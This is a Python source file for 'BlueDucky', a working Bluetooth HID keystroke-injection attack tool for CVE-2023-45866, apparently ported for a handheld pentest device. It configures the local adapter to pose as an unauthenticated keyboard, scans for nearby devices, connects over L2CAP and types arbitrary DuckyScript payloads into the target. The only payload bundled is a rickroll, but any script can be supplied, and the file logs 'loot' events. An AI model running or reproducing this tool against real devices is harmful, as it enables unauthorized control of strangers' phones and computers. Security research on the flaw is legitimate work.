"""BlueDucky — BLE HID keystroke injection (CVE-2023-45866).

Ported from JanOS. Exploits unauthenticated Bluetooth HID pairing
to inject keystrokes into nearby devices.
Runs on the uConsole (pybluez + D-Bus), does NOT use ESP32 serial.
"""

import os
import re
import threading
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# HID keycodes
# ---------------------------------------------------------------------------

_MOD_NONE = 0x00
_MOD_LCTRL = 0x01
_MOD_LSHIFT = 0x02
_MOD_LALT = 0x04
_MOD_LGUI = 0x08

_KEY_ENTER = 0x28
_KEY_ESCAPE = 0x29
_KEY_BACKSPACE = 0x2A
_KEY_TAB = 0x2B
_KEY_SPACE = 0x2C
_KEY_DELETE = 0x4C
_KEY_RIGHT = 0x4F
_KEY_LEFT = 0x50
_KEY_DOWN = 0x51
_KEY_UP = 0x52

_ASCII_MAP: dict[str, tuple[int, bool]] = {}

def _init_ascii_map() -> None:
    for i, ch in enumerate("abcdefghijklmnopqrstuvwxyz"):
        _ASCII_MAP[ch] = (0x04 + i, False)
        _ASCII_MAP[ch.upper()] = (0x04 + i, True)
    _digit_keys = [0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27]
    for i, ch in enumerate("1234567890"):
        _ASCII_MAP[ch] = (_digit_keys[i], False)
    for ch, kc in {" ": 0x2C, "-": 0x2D, "=": 0x2E, "[": 0x2F, "]": 0x30,
                    "\\": 0x31, ";": 0x33, "'": 0x34, "`": 0x35, ",": 0x36,
                    ".": 0x37, "/": 0x38}.items():
        _ASCII_MAP[ch] = (kc, False)
    for ch, kc in {"!": 0x1E, "@": 0x1F, "#": 0x20, "$": 0x21, "%": 0x22,
                    "^": 0x23, "&": 0x24, "*": 0x25, "(": 0x26, ")": 0x27,
                    "_": 0x2D, "+": 0x2E, "{": 0x2F, "}": 0x30, "|": 0x31,
                    ":": 0x33, '"': 0x34, "~": 0x35, "<": 0x36, ">": 0x37,
                    "?": 0x38}.items():
        _ASCII_MAP[ch] = (kc, True)

_init_ascii_map()

_NAMED_KEYS = {
    "ENTER": _KEY_ENTER, "RETURN": _KEY_ENTER, "ESCAPE": _KEY_ESCAPE,
    "ESC": _KEY_ESCAPE, "BACKSPACE": _KEY_BACKSPACE, "DELETE": _KEY_DELETE,
    "TAB": _KEY_TAB, "SPACE": _KEY_SPACE,
    "UP": _KEY_UP, "DOWN": _KEY_DOWN, "LEFT": _KEY_LEFT, "RIGHT": _KEY_RIGHT,
    "F1": 0x3A, "F2": 0x3B, "F3": 0x3C, "F4": 0x3D,
    "F5": 0x3E, "F6": 0x3F, "F7": 0x40, "F8": 0x41,
    "F9": 0x42, "F10": 0x43, "F11": 0x44, "F12": 0x45,
}

_MOD_NAMES = {
    "CTRL": _MOD_LCTRL, "CONTROL": _MOD_LCTRL, "SHIFT": _MOD_LSHIFT,
    "ALT": _MOD_LALT, "GUI": _MOD_LGUI, "WINDOWS": _MOD_LGUI,
    "SUPER": _MOD_LGUI, "META": _MOD_LGUI,
}

# SDP record XML for HID Keyboard profile
_SDP_RECORD_XML = """<?xml version="1.0" encoding="UTF-8" ?>
<record>
  <attribute id="0x0001"><sequence><uuid value="0x1124"/></sequence></attribute>
  <attribute id="0x0004"><sequence><sequence><uuid value="0x0100"/><uint16 value="0x0011"/></sequence><sequence><uuid value="0x0011"/></sequence></sequence></attribute>
  <attribute id="0x0005"><sequence><uuid value="0x1002"/></sequence></attribute>
  <attribute id="0x0009"><sequence><sequence><uuid value="0x1124"/><uint16 value="0x0100"/></sequence></sequence></attribute>
  <attribute id="0x0100"><text value="Keyboard"/></attribute>
  <attribute id="0x0101"><text value="Bluetooth HID Keyboard"/></attribute>
  <attribute id="0x0200"><uint16 value="0x0100"/></attribute>
  <attribute id="0x0201"><uint16 value="0x0111"/></attribute>
  <attribute id="0x0202"><uint8 value="0x40"/></attribute>
  <attribute id="0x0203"><uint8 value="0x00"/></attribute>
  <attribute id="0x0204"><boolean value="true"/></attribute>
  <attribute id="0x0205"><boolean value="true"/></attribute>
  <attribute id="0x0206"><sequence><sequence><uint8 value="0x22"/><text encoding="hex" value="05010906a101850175019508050719e029e715002501810295017508810395057501050819012905910295017503910195067508150026ff000507190029ff8100c0"/></sequence></sequence></attribute>
  <attribute id="0x020b"><uint16 value="0x0100"/></attribute>
  <attribute id="0x020c"><uint16 value="0x0c80"/></attribute>
  <attribute id="0x020d"><boolean value="true"/></attribute>
  <attribute id="0x020e"><boolean value="true"/></attribute>
</record>"""

RICKROLL_PAYLOAD = """REM Rick Roll
DELAY 500
ESCAPE
DELAY 200
GUI d
DELAY 500
GUI b
DELAY 1000
CTRL l
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
DELAY 300
ENTER
"""

# ---------------------------------------------------------------------------
# L2CAP HID Client
# ---------------------------------------------------------------------------

class L2CAPHIDClient:
    PSM_CTRL = 17
    PSM_INTR = 19

    def __init__(self):
        self._ctrl_sock = None
        self._intr_sock = None
        self._connected = False

    @property
    def connected(self) -> bool:
        return self._connected

    def connect(self, target_addr: str, timeout: float = 10.0):
        import bluetooth
        self._ctrl_sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        self._intr_sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        self._ctrl_sock.settimeout(timeout)
        self._intr_sock.settimeout(timeout)
        self._ctrl_sock.connect((target_addr, self.PSM_CTRL))
        self._intr_sock.connect((target_addr, self.PSM_INTR))
        self._connected = True

    def close(self):
        for sock in (self._intr_sock, self._ctrl_sock):
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        self._ctrl_sock = None
        self._intr_sock = None
        self._connected = False

    def send_key(self, modifier: int, keycode: int):
        if not self._connected or not self._intr_sock:
            return
        report = bytes([0xa1, 0x01, modifier, 0x00, keycode, 0, 0, 0, 0, 0])
        self._intr_sock.send(report)
        time.sleep(0.004)
        release = bytes([0xa1, 0x01, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0])
        self._intr_sock.send(release)
        time.sleep(0.02)

    def send_string(self, text: str) -> int:
        count = 0
        for ch in text:
            if ch == "\n":
                self.send_key(_MOD_NONE, _KEY_ENTER)
                count += 1
            elif ch == "\t":
                self.send_key(_MOD_NONE, _KEY_TAB)
                count += 1
            elif ch in _ASCII_MAP:
                kc, shift = _ASCII_MAP[ch]
                self.send_key(_MOD_LSHIFT if shift else _MOD_NONE, kc)
                count += 1
        return count


# ---------------------------------------------------------------------------
# DuckyScript
# ---------------------------------------------------------------------------

def parse_duckyscript(script: str) -> list[tuple[str, str]]:
    commands = []
    for raw in script.splitlines():
        line = raw.strip()
        if not line or line.startswith("REM ") or line.startswith("//"):
            continue
        parts = line.split(None, 1)
        commands.append((parts[0].upper(), parts[1] if len(parts) > 1 else ""))
    return commands


def execute_duckyscript(client, commands, log_fn=None, stop_check=None) -> int:
    total = 0
    for cmd, arg in commands:
        if stop_check and stop_check():
            break
        if cmd == "STRING":
            n = client.send_string(arg)
            total += n
            if log_fn:
                log_fn(f"[BD] STRING: {arg[:40]}{'...' if len(arg) > 40 else ''}")
        elif cmd == "DELAY":
            try:
                ms = int(arg)
            except ValueError:
                ms = 100
            time.sleep(ms / 1000.0)
        elif cmd in ("ENTER", "RETURN"):
            client.send_key(_MOD_NONE, _KEY_ENTER); total += 1
        elif cmd == "TAB":
            client.send_key(_MOD_NONE, _KEY_TAB); total += 1
        elif cmd in ("ESCAPE", "ESC"):
            client.send_key(_MOD_NONE, _KEY_ESCAPE); total += 1
        elif cmd in ("BACKSPACE", "DELETE", "SPACE"):
            client.send_key(_MOD_NONE, _NAMED_KEYS.get(cmd, 0)); total += 1
        elif cmd in ("UP", "DOWN", "LEFT", "RIGHT"):
            client.send_key(_MOD_NONE, _NAMED_KEYS[cmd]); total += 1
        elif cmd in _NAMED_KEYS:
            client.send_key(_MOD_NONE, _NAMED_KEYS[cmd]); total += 1
        elif cmd in _MOD_NAMES:
            mod_bit = _MOD_NAMES[cmd]
            if arg:
                au = arg.strip().upper()
                if au in _NAMED_KEYS:
                    client.send_key(mod_bit, _NAMED_KEYS[au])
                elif len(arg.strip()) == 1 and arg.strip().lower() in _ASCII_MAP:
                    kc, shift = _ASCII_MAP[arg.strip().lower()]
                    client.send_key(mod_bit | (_MOD_LSHIFT if shift else 0), kc)
            total += 1
    return total


# ---------------------------------------------------------------------------
# BlueZ helpers
# ---------------------------------------------------------------------------

def _setup_adapter(log_fn=None) -> bool:
    try:
        import dbus
        bus = dbus.SystemBus()
        adapter = dbus.Interface(
            bus.get_object("org.bluez", "/org/bluez/hci0"),
            "org.freedesktop.DBus.Properties")
        adapter.Set("org.bluez.Adapter1", "Powered", dbus.Boolean(True))
        adapter.Set("org.bluez.Adapter1", "Alias", dbus.String("BLE Keyboard"))
        os.system("hciconfig hci0 class 0x002540 >/dev/null 2>&1")
        os.system("btmgmt ssp off >/dev/null 2>&1")
        os.system("btmgmt connectable on >/dev/null 2>&1")
        os.system("btmgmt bondable on >/dev/null 2>&1")
        os.system("btmgmt io-cap 3 >/dev/null 2>&1")
        if log_fn:
            log_fn("[BD] Adapter configured")
        return True
    except Exception as e:
        if log_fn:
            log_fn(f"[BD] Adapter setup failed: {e}")
        return False


def _register_hid(log_fn=None) -> bool:
    try:
        import dbus
        bus = dbus.SystemBus()
        mgr = dbus.Interface(
            bus.get_object("org.bluez", "/org/bluez"),
            "org.bluez.ProfileManager1")
        opts = {
            "Role": dbus.String("server"),
            "RequireAuthentication": dbus.Boolean(False),
            "RequireAuthorization": dbus.Boolean(False),
            "AutoConnect": dbus.Boolean(True),
            "ServiceRecord": dbus.String(_SDP_RECORD_XML),
        }
        mgr.RegisterProfile(dbus.ObjectPath("/org/bluez/hid"),
                            "00001124-0000-1000-8000-00805f9b34fb", opts)
        return True
    except Exception:
        return True  # may already be registered


def _scan_bt(duration=8, log_fn=None) -> list[tuple[str, str]]:
    try:
        import bluetooth
        if log_fn:
            log_fn(f"[BD] Scanning {duration}s...")
        return bluetooth.discover_devices(
            duration=duration, lookup_names=True,
            flush_cache=True, lookup_class=False)
    except Exception as e:
        if log_fn:
            log_fn(f"[BD] Scan failed: {e}")
        return []


# ---------------------------------------------------------------------------
# BlueDucky Attack
# ---------------------------------------------------------------------------

class BlueDuckyAttack:
    """BlueDucky BT HID injection — headless (no urwid)."""

    def __init__(self, msg_fn=None, loot=None):
        self._msg = msg_fn or (lambda *a: None)
        self._loot = loot
        self._running = False
        self._thread: threading.Thread | None = None
        self._client = L2CAPHIDClient()
        self._target_addr = ""
        self._target_name = ""
        self.keys_sent = 0
        self.scanned_devices: list[tuple[str, str]] = []

    @property
    def running(self) -> bool:
        return self._running

    @property
    def connected(self) -> bool:
        return self._client.connected

    def scan(self) -> None:
        """Scan for BT devices in background thread."""
        if self._running:
            return
        self._running = True

        def _scan():
            devices = _scan_bt(duration=8, log_fn=self._msg)
            self.scanned_devices = devices
            self._running = False
            if not devices:
                self._msg("[BD] No devices found")
                return
            self._msg(f"[BD] Found {len(devices)} device(s):")
            for i, (addr, name) in enumerate(devices):
                self._msg(f"  {i+1}. {addr}  {name or '(unknown)'}")

        self._thread = threading.Thread(target=_scan, daemon=True)
        self._thread.start()

    def connect(self, addr: str, name: str = "",
                on_connected=None) -> None:
        """Connect to target in background."""
        self._target_addr = addr
        self._target_name = name or addr
        self._running = True
        self._msg(f"[BD] Connecting to {addr}...")

        def _conn():
            try:
                if not _setup_adapter(self._msg):
                    self._running = False
                    return
                _register_hid(self._msg)
                self._client.connect(addr, timeout=10.0)
                self._msg(f"[BD] Connected to {addr}!")
                if self._loot:
                    self._loot.log_attack_event(f"BLUEDUCKY: Connected to {addr}")
                if on_connected:
                    on_connected()
                    return
            except (TimeoutError, OSError) as e:
                self._msg(f"[BD] Failed: {e}")
                if "timed out" in str(e).lower():
                    self._msg("[BD] Target may be patched (CVE-2023-45866)")
                self._client.close()
            except Exception as e:
                self._msg(f"[BD] Failed: {e}")
                self._client.close()
            finally:
                self._running = False

        self._thread = threading.Thread(target=_conn, daemon=True)
        self._thread.start()

    def execute_payload(self, script: str, name: str = "payload") -> None:
        """Execute DuckyScript payload in background."""
        if not self._client.connected:
            self._msg("[BD] Not connected")
            return
        self._running = True
        self._msg(f"[BD] Executing: {name}")

        def _run():
            try:
                commands = parse_duckyscript(script)
                count = execute_duckyscript(
                    self._client, commands,
                    log_fn=self._msg,
                    stop_check=lambda: not self._running)
                self.keys_sent += count
                self._msg(f"[BD] Done! {count} keystrokes")
                if self._loot:
                    self._loot.log_attack_event(
                        f"BLUEDUCKY: {name} — {count} keys to {self._target_addr}")
            except Exception as e:
                self._msg(f"[BD] Error: {e}")
            finally:
                self._running = False

        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()

    def rickroll(self) -> None:
        """Full auto: if connected, play. If not, scan → pick first → connect → play."""
        if self._client.connected:
            self.execute_payload(RICKROLL_PAYLOAD, "Rick Roll")
            return
        self._msg("[BD] Rickroll: connect to a device first")

    def stop(self) -> None:
        self._running = False
        if self._client.connected:
            self._client.close()
            self._msg("[BD] Disconnected")
        self.keys_sent = 0
